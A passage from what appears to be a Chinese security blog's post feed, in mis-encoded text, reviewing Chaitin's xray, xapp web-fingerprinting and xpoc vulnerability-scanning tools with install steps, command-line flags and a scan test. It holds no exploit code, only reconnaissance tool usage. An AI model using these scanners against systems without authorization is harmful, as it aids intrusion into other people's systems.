style="zoom:50%;"><p>æœåŠ¡æ‰«æä»…æ”¯æŒtomcatå’Œweblogicã€‚è¿˜æ˜¯webscanæ›´å¥½ç”¨ä¸€ç‚¹ã€‚</p><p>ç›¸æ¯”fscané€Šè‰²å¾ˆå¤šï¼Œfscané’ˆå¯¹redisæœªæˆæƒè®¿é—®çš„æ¼æ´ç”šè‡³èƒ½ç›´æ¥å†™å…¬é’¥ã€‚</p><h1 id="å®˜æ–¹æ–‡æ¡£"><a href="#å®˜æ–¹æ–‡æ¡£" class="headerlink" title="å®˜æ–¹æ–‡æ¡£"></a>å®˜æ–¹æ–‡æ¡£</h1><ul><li><p><a href="https://docs.xray.cool/Introduction">https://docs.xray.cool/Introduction</a></p></li><li><p><a href="https://docs.xray.cool/tools/xray/Scanning">https://docs.xray.cool/tools/xray/Scanning</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> æ¼æ´æ‰«æ </tag>
            
            <tag> Xray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webæŒ‡çº¹è¯†åˆ«å·¥å…·xapp</title>
      <link href="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/"/>
      <url>/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h1><p>xappæ˜¯ä¸€æ¬¾ä¸“æ³¨äºwebæŒ‡çº¹è¯†åˆ«çš„å·¥å…·ã€‚ä½ å¯ä»¥ä½¿ç”¨xappå¯¹webç›®æ ‡æ‰€ä½¿ç”¨çš„æŠ€æœ¯è¿›è¡Œè¯†åˆ«ï¼Œä¸ºå®‰å…¨æµ‹è¯•åšå¥½å‡†å¤‡ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/chaitin/xapp">https://github.com/chaitin/xapp</a></p><ol><li>æ”¯æŒwebæŒ‡çº¹è¯†åˆ«ï¼Œå¯ä»¥å¿«é€Ÿè¯†åˆ«webç›®æ ‡çš„æŠ€æœ¯æ ˆï¼Œä¸ºå®‰å…¨æµ‹è¯•æä¾›åŸºç¡€æ•°æ®ã€‚</li><li>è§„åˆ™è¯­æ³•ä¸xray PoCä¿æŒä¸€è‡´ï¼Œç®€å•æ˜“æ‡‚ï¼Œé€‚åˆæ–°æ‰‹å¼€å‘è€…å¿«é€Ÿä¸Šæ‰‹ã€‚</li><li>è‡ªå®šä¹‰æŒ‡çº¹è§„åˆ™ï¼Œå®ç°ç²¾ç»†é€»è¾‘åˆ†æ”¯ï¼Œå¢å¼ºè¯†åˆ«çš„å‡†ç¡®æ€§å’Œçµæ´»æ€§ã€‚</li><li>å¼€æ”¾å…±åˆ›ï¼šé¼“åŠ±ç¤¾åŒºå‚ä¸ï¼Œå…±åŒåœ¨GitHubä¸Šæ„å»ºæ ‡å‡†çš„<a href="https://github.com/chaitin/xray-plugins">æŒ‡çº¹è§„åˆ™é›†</a>ï¼Œåˆ†äº«è‡ªå·±çš„æŒ‡çº¹è§„åˆ™é›†ï¼Œå…è´¹ä¾›æ‰€æœ‰äººä½¿ç”¨ã€‚</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šä¸“é—¨é’ˆå¯¹åŒæ—¶åŠ è½½å¤§é‡æŒ‡çº¹çš„åœºæ™¯è¿›è¡Œä¼˜åŒ–ï¼Œæé«˜è¿è¡Œæ•ˆç‡ã€‚</li></ol><h1 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h1><h2 id="2-1-ä¸‹è½½å®‰è£…"><a href="#2-1-ä¸‹è½½å®‰è£…" class="headerlink" title="2.1 ä¸‹è½½å®‰è£…"></a>2.1 ä¸‹è½½å®‰è£…</h2><p>åœ¨<a href="https://github.com/chaitin/xapp/releases">releases</a>ä¸­ä¸‹è½½å¯¹åº”çš„ç³»ç»Ÿçš„æœ€æ–°ç‰ˆå³å¯ï¼Œè¿è¡Œ<code>xapp -h</code>å³å¯æŸ¥çœ‹å¸®åŠ©ã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆ›å»ºä¸€ä¸ªç›®å½•xappï¼Œç„¶åå°†ä¸‹è½½çš„æ–‡ä»¶æ”¾åœ¨xappç›®å½•ä¸­ï¼Œ+xæƒé™ï¼Œæ›´æ”¹åå­—ä¸ºxappï¼Œæµ‹è¯•æ‰§è¡Œã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2010.55.16.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2010.57.42.png" style="zoom:50%;"><h2 id="2-2-é…ç½®ç¯å¢ƒå˜é‡"><a href="#2-2-é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2.2 é…ç½®ç¯å¢ƒå˜é‡"></a>2.2 é…ç½®ç¯å¢ƒå˜é‡</h2><p><code>vim ~/.zshrc</code></p><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2010.59.46.png" style="zoom:50%;"><p><code>source ~/.zshrc</code></p><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.00.54.png" style="zoom:50%;"><h2 id="2-3-é…ç½®æ–‡ä»¶"><a href="#2-3-é…ç½®æ–‡ä»¶" class="headerlink" title="2.3 é…ç½®æ–‡ä»¶"></a>2.3 é…ç½®æ–‡ä»¶</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.01.37.png" style="zoom:50%;"><p>æ‰§è¡Œxappä¹‹åï¼Œä¼šåœ¨å³ç›®å½•.xrayç›®å½•ä¸‹ç”Ÿæˆç›¸åº”çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœä¸æŒ‡å®šxapp-config.yamlï¼Œä½¿ç”¨é»˜è®¤çš„é…ç½®æ–‡ä»¶ã€‚</p><h1 id="ä¸‰ã€ä½¿ç”¨"><a href="#ä¸‰ã€ä½¿ç”¨" class="headerlink" title="ä¸‰ã€ä½¿ç”¨"></a>ä¸‰ã€ä½¿ç”¨</h1><h2 id="3-1-æŒ‡å®šæŒ‡çº¹æ‰«æå•ä¸ªç›®æ ‡"><a href="#3-1-æŒ‡å®šæŒ‡çº¹æ‰«æå•ä¸ªç›®æ ‡" class="headerlink" title="3.1 æŒ‡å®šæŒ‡çº¹æ‰«æå•ä¸ªç›®æ ‡"></a>3.1 æŒ‡å®šæŒ‡çº¹æ‰«æå•ä¸ªç›®æ ‡</h2><pre class="line-numbers language-none"><code class="language-none">xapp -r xxx.yml -t https://www.example.comecho https://www.example.com | xapp -r xxx.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-æŒ‡å®šæŒ‡çº¹æ‰«æå¤šä¸ªç›®æ ‡"><a href="#3-2-æŒ‡å®šæŒ‡çº¹æ‰«æå¤šä¸ªç›®æ ‡" class="headerlink" title="3.2 æŒ‡å®šæŒ‡çº¹æ‰«æå¤šä¸ªç›®æ ‡"></a>3.2 æŒ‡å®šæŒ‡çº¹æ‰«æå¤šä¸ªç›®æ ‡</h2><pre class="line-numbers language-none"><code class="language-none">xapp -r xxx.yml -t https://www.example.com -t https://www.example2.comxapp -r xxx.yml -i targets.txtcat targets.txt | xapp -r xxx.yml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-3-æŒ‡å®šå¤šä¸ªæŒ‡çº¹è¿›è¡Œæ‰«æï¼š"><a href="#3-3-æŒ‡å®šå¤šä¸ªæŒ‡çº¹è¿›è¡Œæ‰«æï¼š" class="headerlink" title="3.3 æŒ‡å®šå¤šä¸ªæŒ‡çº¹è¿›è¡Œæ‰«æï¼š"></a>3.3 æŒ‡å®šå¤šä¸ªæŒ‡çº¹è¿›è¡Œæ‰«æï¼š</h2><pre class="line-numbers language-none"><code class="language-none">xapp -r xxx.yml -r yyy.yml -t https://www.example.comxapp -r "./finger/web/*.yml" -t https://www.example.comxapp -r "./finger/**/*.yml" -t https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-4-æŒ‡å®šgroupè¿›è¡Œæ‰«æï¼š"><a href="#3-4-æŒ‡å®šgroupè¿›è¡Œæ‰«æï¼š" class="headerlink" title="3.4 æŒ‡å®šgroupè¿›è¡Œæ‰«æï¼š"></a>3.4 æŒ‡å®šgroupè¿›è¡Œæ‰«æï¼š</h2><pre class="line-numbers language-none"><code class="language-none">xapp -g web.list -t https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å››ã€å‚æ•°"><a href="#å››ã€å‚æ•°" class="headerlink" title="å››ã€å‚æ•°"></a>å››ã€å‚æ•°</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ç¤ºä¾‹:     Scan single target:       xapp <span class="token parameter variable">-t</span> http://192.168.1.1:8000     â””<span class="token operator">&gt;</span>  multiple targets:     xapp <span class="token parameter variable">-t</span> http://192.168.1.1:8000 <span class="token parameter variable">-t</span> http://192.168.1.1:8001     â””<span class="token operator">&gt;</span>  target file:          xapp <span class="token parameter variable">-i</span> a.txt     Show plugin:              xapp <span class="token parameter variable">-v</span>     â””<span class="token operator">&gt;</span>  run one plugin:       xapp <span class="token parameter variable">-t</span> http://192.168.1.1:8000 <span class="token parameter variable">-r</span> <span class="token string">"./finger/finger.yml"</span>     â””<span class="token operator">&gt;</span>  run plugins:          xapp <span class="token parameter variable">-t</span> http://192.168.1.1:8000 <span class="token parameter variable">-r</span> <span class="token string">"./finger/*.yml"</span>æè¿°:   web application scannerå‘½ä»¤:   lint     å¯¹ yaml è„šæœ¬è¿›è¡Œé™æ€æ ¼å¼æ ¡éªŒ   score    å¯¹ yaml æŒ‡çº¹è„šæœ¬è¿›è¡Œè¯„åˆ†   help, h  Shows a list of commands or <span class="token builtin class-name">help</span> <span class="token keyword">for</span> one <span class="token builtin class-name">command</span>é€‰é¡¹:   HTTPå®¢æˆ·ç«¯ï¼š     <span class="token parameter variable">--hrps</span> value, <span class="token parameter variable">--host_rps</span> value             å¯¹äºå•ä¸ªHostçš„æ¯ç§’æœ€å¤§å‘é€è¯·æ±‚æ•°: å°äºç­‰äº0æ—¶ä¸é™åˆ¶æ¯ç§’æœ€å¤§å‘é€è¯·æ±‚æ•° <span class="token punctuation">(</span>default: <span class="token number">0</span><span class="token punctuation">)</span>     --http-proxy value <span class="token punctuation">[</span> --http-proxy value <span class="token punctuation">]</span>  HTTPå®¢æˆ·ç«¯ä»£ç†: <span class="token punctuation">[</span>http<span class="token operator">|</span>https<span class="token operator">|</span>socks5://<span class="token punctuation">]</span><span class="token punctuation">[</span>username<span class="token punctuation">[</span>:password<span class="token punctuation">]</span>@<span class="token punctuation">]</span>host<span class="token punctuation">[</span>:port<span class="token punctuation">]</span> ä»…å¯¹httpè¿æ¥ç”Ÿæ•ˆ     <span class="token parameter variable">--retry</span> value                              è¯·æ±‚å¤±è´¥é‡è¯•æ¬¡æ•° <span class="token punctuation">(</span>default: <span class="token number">2</span><span class="token punctuation">)</span>   æ’ä»¶å±•ç¤ºï¼š     <span class="token parameter variable">-v</span>  åˆ—å‡ºå¯ç”¨çš„æ’ä»¶ <span class="token punctuation">(</span>default: <span class="token boolean">false</span><span class="token punctuation">)</span>   æ—¥å¿—ç®¡ç†ï¼š     <span class="token parameter variable">--debug</span>            è°ƒè¯•ï¼šæ‰“å°debugæ—¥å¿— <span class="token punctuation">(</span>default: <span class="token boolean">false</span><span class="token punctuation">)</span>     --log-level value  æŒ‡å®šç­‰çº§ï¼šdebug/info<span class="token punctuation">(</span>é»˜è®¤<span class="token punctuation">)</span>/warn/error/fatal/disable     <span class="token parameter variable">--silent</span>           é™é»˜ï¼šä¸æ‰“å°bannerï¼Œæ—¥å¿—ç­‰çº§è®¾ç½®ä¸ºfatal <span class="token punctuation">(</span>default: <span class="token boolean">false</span><span class="token punctuation">)</span>   ç›®æ ‡æ‹†è§£ï¼š     <span class="token parameter variable">-i</span> value               ç›®æ ‡æ–‡ä»¶: æŒ‡å®šå«æœ‰æ‰«æç›®æ ‡çš„æ–‡æœ¬æ–‡ä»¶     <span class="token parameter variable">-t</span> value <span class="token punctuation">[</span> <span class="token parameter variable">-t</span> value <span class="token punctuation">]</span>  æ‰«æç›®æ ‡: å¯ä»¥ä¸ºURL/IP/åŸŸå/Host:Portç­‰å¤šç§å½¢å¼çš„æ··åˆè¾“å…¥ ï¼ˆé»˜è®¤ï¼‰   ç»“æœè¾“å‡ºï¼š     <span class="token parameter variable">-o</span> value <span class="token punctuation">[</span> <span class="token parameter variable">-o</span> value <span class="token punctuation">]</span>  ç»“æœè¾“å‡º: æŒ‡å®šä¿å­˜ç»“æœçš„æ–‡ä»¶è·¯å¾„   è¿æ¥ç®¡ç†ï¼š     <span class="token parameter variable">--proxy</span> value    å…¨å±€ä»£ç†ï¼šsocks5://<span class="token punctuation">[</span>username<span class="token punctuation">[</span>:password<span class="token punctuation">]</span>@<span class="token punctuation">]</span>host<span class="token punctuation">[</span>:port<span class="token punctuation">]</span> ä»…æ”¯æŒsocks5ï¼Œå¯¹æ‰€æœ‰è¿æ¥ç”Ÿæ•ˆ     <span class="token parameter variable">--timeout</span> value  è¯»è¶…æ—¶: ä»è¿æ¥ä¸­è¯»å–æ•°æ®çš„æœ€å¤§è€—æ—¶ <span class="token punctuation">(</span>default: 5s<span class="token punctuation">)</span>   é€šç”¨ï¼š     <span class="token parameter variable">--config</span> value                                           é…ç½®æ–‡ä»¶ï¼šä½¿ç”¨æŒ‡å®šçš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™è‡ªåŠ¨åˆ›å»ºé»˜è®¤é…ç½®æ–‡ä»¶     <span class="token parameter variable">-d</span> value, <span class="token parameter variable">--disable</span> value <span class="token punctuation">[</span> <span class="token parameter variable">-d</span> value, <span class="token parameter variable">--disable</span> value <span class="token punctuation">]</span>  ç¦ç”¨ï¼šç¦æ­¢ç‰¹å®šæ’ä»¶æ‰§è¡Œï¼Œä»…æ”¯æŒè¾“å…¥æ’ä»¶å     <span class="token parameter variable">-g</span> value, <span class="token parameter variable">--group</span> value <span class="token punctuation">[</span> <span class="token parameter variable">-g</span> value, <span class="token parameter variable">--group</span> value <span class="token punctuation">]</span>      æ’ä»¶ç»„ï¼šæ‰§è¡ŒæŒ‡å®šçš„æ’ä»¶ç»„æ–‡ä»¶     <span class="token parameter variable">-r</span> value, <span class="token parameter variable">--run</span> value <span class="token punctuation">[</span> <span class="token parameter variable">-r</span> value, <span class="token parameter variable">--run</span> value <span class="token punctuation">]</span>          ä»…æ‰§è¡Œï¼šä»…æ‰§è¡ŒæŒ‡å®šçš„æ’ä»¶ï¼Œæ”¯æŒglob/ç»å¯¹è·¯å¾„/ç›¸å¯¹è·¯å¾„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€æ’ä»¶å­˜å‚¨åº“"><a href="#äº”ã€æ’ä»¶å­˜å‚¨åº“" class="headerlink" title="äº”ã€æ’ä»¶å­˜å‚¨åº“"></a>äº”ã€æ’ä»¶å­˜å‚¨åº“</h1><p>åœ°å€ï¼š<a href="https://github.com/chaitin/xray-plugins">https://github.com/chaitin/xray-plugins</a></p><h2 id="5-1-ä»“åº“ç”¨é€”"><a href="#5-1-ä»“åº“ç”¨é€”" class="headerlink" title="5.1 ä»“åº“ç”¨é€”"></a>5.1 ä»“åº“ç”¨é€”</h2><p>ä¸ºå„ç±»æ’ä»¶åˆ›å»ºäº†ä¸€ä¸ªä¸“é—¨çš„å­˜å‚¨åº“ï¼Œæ—¨åœ¨æ–¹ä¾¿å¤§å®¶å…±äº«å’Œä½¿ç”¨å„ç§æ’ä»¶ã€‚</p><p>è¿™é‡Œä¸»è¦æ”¶å½•çš„æ˜¯å¼€æºçš„ã€è½¬åŒ–æˆ xrayæ ¼å¼çš„è„šæœ¬ï¼Œä»¥ä¾›å¤§å®¶ä½¿ç”¨ã€‚</p><h2 id="5-2-æ’ä»¶æ–‡ä»¶æ ¼å¼"><a href="#5-2-æ’ä»¶æ–‡ä»¶æ ¼å¼" class="headerlink" title="5.2 æ’ä»¶æ–‡ä»¶æ ¼å¼"></a>5.2 æ’ä»¶æ–‡ä»¶æ ¼å¼</h2><p>æœ¬ä»“åº“ä¸­çš„æ’ä»¶åŒ…æ‹¬æŒ‡çº¹ã€POC ä»¥åŠä¸€äº›æŒ‡å®šè¿è¡Œçš„æ–‡ä»¶åˆ—è¡¨ã€‚æ¨èä½¿ç”¨ä»¥ä¸‹å·¥å…·æ¥è¿è¡Œè¿™äº›æ’ä»¶ï¼š</p><ul><li>æŒ‡çº¹ï¼šæ¨èä½¿ç”¨ xapp è¿è¡Œ</li><li>POCï¼šæ¨èä½¿ç”¨ xpoc è¿è¡Œ</li><li>Group Listï¼šå…¶ä¸­å­˜æ”¾ç€ä¸€äº›æ¢³ç†è¿‡çš„æŒ‡å®šè¿è¡Œçš„æ–‡ä»¶åˆ—è¡¨ï¼Œæ¨èä½¿ç”¨xappã€xpoc -g è¿è¡Œã€‚</li></ul><h2 id="5-3-âš ï¸-ä½¿ç”¨é¡»çŸ¥"><a href="#5-3-âš ï¸-ä½¿ç”¨é¡»çŸ¥" class="headerlink" title="5.3 âš ï¸ ä½¿ç”¨é¡»çŸ¥"></a>5.3 âš ï¸ ä½¿ç”¨é¡»çŸ¥</h2><p>è¯·æ³¨æ„ï¼Œæœ¬ä»“åº“ä¸­çš„æ’ä»¶ä»…ç»è¿‡ xlint éªŒè¯ï¼Œæœªç»è¿‡å®é™…é¶ç«™çš„éªŒè¯ï¼Œå› æ­¤è¿™äº›æ’ä»¶çš„å†…å®¹å¯èƒ½å¹¶ä¸ä¸€å®šå®Œå…¨å¯ç”¨ã€‚æˆ‘ä»¬å»ºè®®åœ¨ä½¿ç”¨ä¹‹å‰è‡ªè¡ŒéªŒè¯å…¶æœ‰æ•ˆæ€§ã€‚</p><blockquote><h4 id="ä»€ä¹ˆæ˜¯xlintï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯xlintï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯xlintï¼Ÿ"></a>ä»€ä¹ˆæ˜¯xlintï¼Ÿ</h4><p>xlint æ˜¯ä¸€æ¬¾ä¸“é—¨ç”¨äºå¯¹ xray çš„ YAML æ’ä»¶è¿›è¡Œæ ¼å¼æ£€æµ‹çš„å·¥å…·ï¼Œé€šè¿‡ä½¿ç”¨è¯¥å·¥å…·å¯ä»¥å¯¹è„šæœ¬è¿›è¡Œè§„èŒƒåŒ–æ£€æµ‹ï¼Œç¡®ä¿è„šæœ¬èƒ½å¤Ÿæ­£å¸¸è¿è¡Œã€‚</p><p>åœ°å€ï¼š<a href="https://github.com/chaitin/xray-plugins/releases">https://github.com/chaitin/xray-plugins/releases</a></p><p>ä½¿ç”¨ <code>-f</code> å‚æ•°å¯ä»¥æŒ‡å®šæ£€æµ‹ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€‚é€šè¿‡ä½¿ç”¨å¤šä¸ª <code>-f</code> å‚æ•°ï¼Œæ‚¨è¿˜å¯ä»¥æŒ‡å®šæ£€æµ‹å¤šä¸ªæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xlint <span class="token parameter variable">-f</span> xxx.ymlxlint <span class="token parameter variable">-f</span> <span class="token string">"./finger/*"</span>xlint <span class="token parameter variable">-f</span> <span class="token string">"./finger/*"</span> <span class="token parameter variable">-f</span> <span class="token string">"./poc/*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>ä½¿ç”¨<code>--rules</code>å¯ä»¥æŒ‡å®šæ£€æµ‹æŸä¸€ä¸ªè§„åˆ™ï¼Œé»˜è®¤ä¸å†™å°±å…¨éƒ¨æ‰§è¡Œ<ul><li>celcheck</li><li>schemacheck</li><li>payloadcheck</li><li>transportcheck</li><li>unusedcheck</li></ul></li></ul></blockquote><h2 id="5-4-ä»“åº“ç»“æ„"><a href="#5-4-ä»“åº“ç»“æ„" class="headerlink" title="5.4 ä»“åº“ç»“æ„"></a>5.4 ä»“åº“ç»“æ„</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.23.04.png" style="zoom:50%;"><p>ç¿»äº†ä¸€ä¸‹ä»“åº“å†…å®¹ï¼Œæ’ä»¶å¹¶ä¸å¤šã€‚</p><h2 id="5-5-ä½¿ç”¨"><a href="#5-5-ä½¿ç”¨" class="headerlink" title="5.5 ä½¿ç”¨"></a>5.5 ä½¿ç”¨</h2><p>ç›´æ¥git cloneä¸‹æ¥ï¼Œä½¿ç”¨çš„æ—¶å€™ç”¨å‚æ•°æŒ‡å®šæ’ä»¶ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.34.12.png" style="zoom:50%;"><h1 id="äº”ã€å®æˆ˜ä½¿ç”¨"><a href="#äº”ã€å®æˆ˜ä½¿ç”¨" class="headerlink" title="äº”ã€å®æˆ˜ä½¿ç”¨"></a>äº”ã€å®æˆ˜ä½¿ç”¨</h1><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.09.03.png" style="zoom:50%;"><p>ä½¿ç”¨é»˜è®¤æ–¹å¼æ‰«æä¸€ä¸ªLaravelç«™ç‚¹ï¼Œæ²¡æœ‰è¯†åˆ«å‡ºç›¸åº”çš„æŒ‡çº¹ã€‚</p><p>æœ‰æ•ˆæ€§å ªå¿§ï¼Œéœ€è¦é¢å¤–ä¸‹è½½æŒ‡çº¹è§„åˆ™ã€‚</p><p><a href="https://github.com/chaitin/xray-plugins">https://github.com/chaitin/xray-plugins</a></p><img src="/2025/01/22/gong-fang-gong-ju-ku/web-zhi-wen-shi-bie-gong-ju-xapp/%E6%88%AA%E5%B1%8F2025-01-22%2011.36.49.png" alt="æˆªå±2025-01-22 11.36.49" style="zoom:50%;"><p>åŠ è½½æ’ä»¶æ‰§è¡Œï¼Œæ•ˆæœä¾ç„¶å¾ˆå·®ã€‚æ’ä»¶çš„è¦†ç›–åº¦æ˜æ˜¾ä¸å¤Ÿã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> webæŒ‡çº¹è¯†åˆ« </tag>
            
            <tag> xapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xpocä¾›åº”é“¾æ¼æ´æ‰«æå·¥å…·</title>
      <link href="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/"/>
      <url>/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h1><p>xray2.0ç³»åˆ—çš„ç¬¬ä¸€æ¬¾å·¥å…·æ˜¯xpocï¼Œä»–æ˜¯ä¸€æ¬¾ä¸ºä¾›åº”é“¾æ¼æ´æ‰«æè®¾è®¡çš„å¿«é€Ÿåº”æ€¥å“åº”å·¥å…·ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/chaitin/xpoc?tab=readme-ov-file">https://github.com/chaitin/xpoc?tab=readme-ov-file</a></p><ol><li>æ”¯æŒäº‘ç«¯è·å–POCï¼Œå¯ä»¥ä»¥æœ€å¿«çš„é€Ÿåº¦è¿›è¡Œåº”æ€¥å“åº”</li><li>ä½¿ç”¨xray yaml pocè„šæœ¬æ ¼å¼ï¼Œæ”¯æŒTCP/UDPåè®®çš„æ’ä»¶çš„ç¼–å†™å’ŒåŠ è½½ï¼Œå¹¶å¯ä»¥ä½¿ç”¨golangè‡ªå®šä¹‰æ’ä»¶å®ç°åŠŸèƒ½å¢å¼º</li><li>è‡ªå®šä¹‰golangæ’ä»¶ï¼Œæ”¯æŒæ›´å¤šç§çš„æ¼æ´æ£€æµ‹ï¼Œæ”¯æŒåŠ è½½å·¥å…·æ’ä»¶ç­‰<ul><li>æ¼æ´æ‰«æ</li><li>å‘yamlè„šæœ¬æ³¨å…¥æ–°åŠŸèƒ½</li><li>è‡ªå®šä¹‰çˆ¬è™«</li><li>ç½‘é¡µæˆªå›¾</li><li>â€¦</li></ul></li></ol><h1 id="äºŒã€å®‰è£…éƒ¨ç½²"><a href="#äºŒã€å®‰è£…éƒ¨ç½²" class="headerlink" title="äºŒã€å®‰è£…éƒ¨ç½²"></a>äºŒã€å®‰è£…éƒ¨ç½²</h1><h2 id="2-1-ä¸‹è½½å®‰è£…"><a href="#2-1-ä¸‹è½½å®‰è£…" class="headerlink" title="2.1 ä¸‹è½½å®‰è£…"></a>2.1 ä¸‹è½½å®‰è£…</h2><p>æˆ‘çš„ç³»ç»Ÿæ˜¯macosï¼Œå…¶ä»–é›·åŒï¼Œå®‰è£…ç®€å•ã€‚</p><p>ç›´æ¥ä¸‹è½½releasesç‰ˆæœ¬ï¼š<a href="https://github.com/chaitin/xpoc/releases/">https://github.com/chaitin/xpoc/releases/</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> ~/xpocå°†ä¸‹è½½å¥½çš„æ–‡ä»¶æ”¾åœ¨æ–°å»ºçš„ç›®å½•ä¸­ã€‚<span class="token function">chmod</span> +x xpoc_darwin_amd64<span class="token function">mv</span> xpoc_darwin_amd64 xpoc   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.13.54.png" style="zoom:50%;"><p>æ”¹ä¸ªåå­—ï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.15.26.png" style="zoom:50%;"><p>æ²¡æœ‰é…ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥åªèƒ½åœ¨å½“å‰ç›®å½•æ‰§è¡Œã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.17.25.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.16.18.png" style="zoom:50%;"><h2 id="2-2-è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#2-2-è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2.2 è®¾ç½®ç¯å¢ƒå˜é‡"></a>2.2 è®¾ç½®ç¯å¢ƒå˜é‡</h2><p>ä¸‹é¢é…ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼š</p><ul><li>åœ¨ç»ˆç«¯æ‰§è¡Œ<code>echo $SHELL</code>åˆ¤æ–­è‡ªå·±çš„shellæ˜¯ä»€ä¹ˆç±»å‹:</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.18.47.png" style="zoom:50%;"><ul><li><code>vim ~/.zshrc</code></li><li>è¿½åŠ å†…å®¹ï¼š</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.20.23.png" style="zoom:50%;"><ul><li><code>source ~/.zshrc</code></li><li>æˆåŠŸåœ¨å®¶ç›®å½•ä¸‹æ‰§è¡Œxpoc</li></ul><img 